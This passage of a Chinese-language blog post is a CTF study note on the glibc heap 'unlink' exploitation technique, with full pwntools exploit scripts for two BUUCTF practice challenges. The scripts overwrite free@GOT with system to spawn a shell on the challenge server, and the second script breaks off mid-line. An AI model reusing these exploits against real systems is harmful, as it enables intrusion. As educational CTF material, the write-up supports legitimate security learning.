@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文详细记录了 unlink 漏洞的相关知识和三道例题的复现过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink学习笔记">
+<meta property="og:url" content="http://example.com/unlink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="本文详细记录了 unlink 漏洞的相关知识和三道例题的复现过程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040819.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040873.png">
+<meta property="article:published_time" content="2024-10-13T12:40:06.000Z">
+<meta property="article:modified_time" content="2025-10-28T01:19:21.824Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040819.png">
+
+<link rel="canonical" href="http://example.com/unlink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>unlink学习笔记 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/unlink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          unlink学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-13 20:40:06" itemprop="dateCreated datePublished" datetime="2024-10-13T20:40:06+08:00">2024-10-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-28 09:19:21" itemprop="dateModified" datetime="2025-10-28T09:19:21+08:00">2025-10-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文详细记录了 unlink 漏洞的相关知识和三道例题的复现过程</p>
+<span id="more"></span>
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>假设我们称，指向<em>chunk</em> 的指针区域，为<em>chunk_hook</em> 区域。</p>
+<p><em>unlink</em> 的目的就是，使某个<em>chunk_hook</em> 指向一个<em>chunk_hook</em> ，也就是使<em>chunk_hook</em> 区域可以作为一个<em>chunk</em> ，这样就可以对<em>chunk_hook</em> 区域进行任意泄漏和写，进而也就能对其他地址进行任意泄漏和写。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
+<li><p>将<strong>要被合并的正序第一个</strong>的<em>chunk</em> ，称<code>unlink_chunk</code>；指向<em>free_chunk</em> 的指针，称 <code>unlink_chunk_hook</code>，则：<br><code>fd = unlink_chunk_hook - 0x18</code><br><code>bk = unlink_chunk_hook - 0x10</code></p>
+</li>
+<li><p>将要 <code>free</code> 的<em>chunk</em> ，称 <code>inuse0_chunk</code>，<code>inuse0_chunk</code> 的 <code>prev_size</code> 字段，表示前面所有空闲（<strong>要被合并</strong>）的<em>chunk</em> 的<code>user_data_size</code>。<br><code>inuse0_chunk_prev_size = all_chunk_user_data_size</code></p>
+</li>
+</ul>
+<p><em>unlink</em> 后，<em>unlink_chunk_hook</em> 成功指向<code>fd</code>。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>能使一个<em>chunk</em> 处于<em>free</em> 状态，并且能控制该<em>chunk</em> 的<em>user_data</em> 字段。</p>
+<ol>
+<li>堆溢出，能自由向该<em>chunk</em> 的<em>user_data</em> 中输入数据，并能溢出使后一个<em>chunk</em> 的<em>prev_inuse</em> 位为<code>0</code>。此时该<em>chunk</em> 处于<em>free</em> 状态。</li>
+<li><em>uaf</em> 漏洞。</li>
+</ol>
+<p>能使后一个<em>chunk</em> 被 <code>free</code> 的时候，被放到<em>unsorted bin</em> 中。</p>
+<ol>
+<li>当没有<em>tcache</em> 时，<em>chunk</em> 的大小需大于<em>fast bin</em> 的范围</li>
+</ol>
+<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a><em>hitcontraining_bamboobox</em></h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在<em>change_item</em> 函数中，有堆溢出漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040819.png" alt="1"></p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="确定unlink-chunk-hook"><a href="#确定unlink-chunk-hook" class="headerlink" title="确定unlink_chunk_hook"></a>确定<em>unlink_chunk_hook</em></h4><p>申请<code>3</code>个<em>chunk</em> ，<em>chunk0</em> 作为<em>unlink_chunk</em> 。<em>chunk1</em> 用来使<em>chunk0</em> 处于空闲状态，并合并<em>chunk0</em> 。<em>chunk2</em> 用来防止释放<em>chunk1</em> 后，<em>chunk1</em> 与<em>Top chunk</em> 合并。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)   <span class="comment">#后面执行system的时候会用到</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040873.png" alt="image-20240721194438119"></p>
+<p>如图，在<em>chunk_hook</em> 区域找到<em>unlink_chunk_hook</em> ，并计算出<em>fd</em> 和<em>bk</em> ：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unlink_chunk_hook = <span class="number">0x6020c8</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><em>unlink</em></h4><p>要注意 <code>chunk1</code> 的 <code>prev_size</code> 字段，表示前面空闲的 <code>chunk</code> 的大小</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#p64(0x30) 是free_chunk(即chunk0)的user_data字段大小</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chunk1的prev_inuse位是0，free掉chunk1后，会向前合并chunk0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./a&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25170</span>)</span><br><span class="line">debug(p,<span class="number">0x400E84</span>,<span class="number">0x400E90</span>,<span class="number">0x400E9C</span>,<span class="number">0x400EA8</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">unlink_chunk_hook = <span class="number">0x6020c8</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr-<span class="number">0x3c48e0</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">payload = p64(libc_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a><em>zctf2016_note2</em></h2><h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
+<li>将要 <code>free</code> 的<em>chunk</em> ，称<code>inuse0_chunk</code>。而 <code>inuse0_chunk</code> 的 <code>prev_size</code> 字段，则表示前面所有空闲（<strong>要被合并</strong>）的<em>chunk</em> 的<code>user_data_size</code>。<br><code>inuse0_chunk_prev_size = all_chunk_user_data_size</code></li>
+<li><em>strcpy</em> 以空字符 <code>0</code> 作为结束标志</li>
+</ol>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>如果在创建<em>chunk</em> 时，创建 <code>size = 0</code> 的<em>chunk</em> ，那么在<em>edit</em> 该<em>chunk</em> 时，便可实现溢出。要注意<em>edit</em> 中的 <code>strcpy</code> 函数，会被 <code>00</code> 截断。</p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a><em>edit</em></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = sub_400A4A();   <span class="comment">//v2是index</span></span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = *(&amp;ptr + v2);   <span class="comment">//src是chunk的user_data区域</span></span><br><span class="line">      v5 = qword_602140[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = sub_400A4A();   <span class="comment">//v3是上面选择的1/2</span></span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line"><span class="comment">/*          v7 = malloc(0xA0uLL);</span></span><br><span class="line"><span class="comment">          strcpy(v7, &quot;TheNewContents:&quot;);</span></span><br><span class="line"><span class="comment">          printf(v7);                                                                  */</span></span><br><span class="line">          sub_4009BD((v7 + <span class="number">15</span>), <span class="number">144LL</span>, <span class="number">10</span>);</span><br><span class="line">          sub_400B10(v7 + <span class="number">15</span>);   <span class="comment">//v7+15是我们输入的要edit的数据</span></span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[v5 - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFFL</span>L);</span><br><span class="line">            <span class="comment">//程序将我们edit的数据v7+15，strncat拼接，到dest的末尾</span></span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">            <span class="comment">//将dest区域的数据,strcpy复制,到src(chunk的user_data区域)。</span></span><br><span class="line">            <span class="comment">//strcpy以空字符0作为结束标志</span></span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题需要向前合并 <code>2</code> 个<em>chunk</em> ，因为我们没有办法往<em>chunk1</em> 中写入<code>payload</code>。<em>chunk0</em> 用来布置<em>fd</em> 和<em>bk</em> ；<em>chunk1</em> 用来设置<em>chunk2</em> 的<em>prev_inuse</em> 和<em>precv_size</em> 字段；<em>chunk2</em> 用来向前合并<em>chunk</em> ；<em>chunk3</em> 用来，防止 <code>delete(2)</code> 时与<em>Top chunk</em> 合并。</p>
+<p>创建 <code>4</code> 个<em>chunk</em> ，把<em>chunk0</em> 作为<em>unlink_chunk</em> ，并直接写入<em>fd</em> 和<em>bk</em> 到<em>chunk0</em> 中。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unlink_chun_hook = <span class="number">0x602120</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">paylaod = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,paylaod)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>设置<em>chunk2</em> 的<em>prev_inuse</em> 位为 <code>0</code> ，使<em>chunk1</em> 空闲。设置<em>chunk2</em> 的<em>prev_size</em> 为<code>0x50</code>，当 <code>delete(2)</code> 时，会向前合并 <code>0x70</code> 的内存。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">paylaod = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">num = <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):   </span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;B&#x27;</span>*num)</span><br><span class="line">    num = num-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">paylaod = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x50&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./note2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25053</span>)</span><br><span class="line">debug(p,<span class="number">0x401032</span>,<span class="number">0x401040</span>,<span class="number">0x401047</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:(less than 128)\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your name:\n&quot;</span>,<span class="string">b&#x27;kim&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your address:\n&quot;</span>,<span class="string">b&#x27;wen&#x27;</span>)</span><br><span class="line">free_chunk_hook = <span class="number">0x602120</span></span><br><span class="line">fd = free_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = free_chunk_hook-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">paylaod = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,paylaod)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">paylaod = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">num = <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span 